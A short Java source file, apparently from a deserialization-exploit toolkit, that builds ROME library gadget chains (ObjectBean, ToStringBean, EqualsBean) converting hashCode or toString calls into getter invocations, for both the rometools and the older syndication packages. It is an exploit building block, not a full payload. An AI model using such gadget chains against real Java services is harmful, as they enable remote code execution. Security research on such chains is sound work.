package xyz.eki.marshalexp.gadget.rome;


import com.rometools.rome.feed.impl.ObjectBean;

/**
 * Method.invoke(Object, Object...) -> getter None-Parameter
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 */
public class GRome {
    public static ObjectBean toString2Getter(Class<?> clz, Object o){
//        ToStringBean tb = new ToStringBean(clz, o);
//        EqualsBean eb = new EqualsBean(ToStringBean.class, tb);
        ObjectBean tb = new ObjectBean(clz,o);
        ObjectBean eb = new ObjectBean(ObjectBean.class,tb);
        return eb;
    }

    public static ObjectBean toString2Getter(Object o){
//        ToStringBean tb = new ToStringBean(clz, o);
//        EqualsBean eb = new EqualsBean(ToStringBean.class, tb);
        return toString2Getter(o.getClass(),o);
    }

    public static com.sun.syndication.feed.impl.EqualsBean toString2GetterSynd(Class<?> clz,Object o){
        com.sun.syndication.feed.impl.ToStringBean tb = new com.sun.syndication.feed.impl.ToStringBean(clz,o);
        com.sun.syndication.feed.impl.EqualsBean eb = new com.sun.syndication.feed.impl.EqualsBean(com.sun.syndication.feed.impl.ToStringBean.class,tb);
        return eb;
    }

    public static com.sun.syndication.feed.impl.EqualsBean  toString2GetterSynd(Object o){
        return toString2GetterSynd(o.getClass(),o);
    }
}
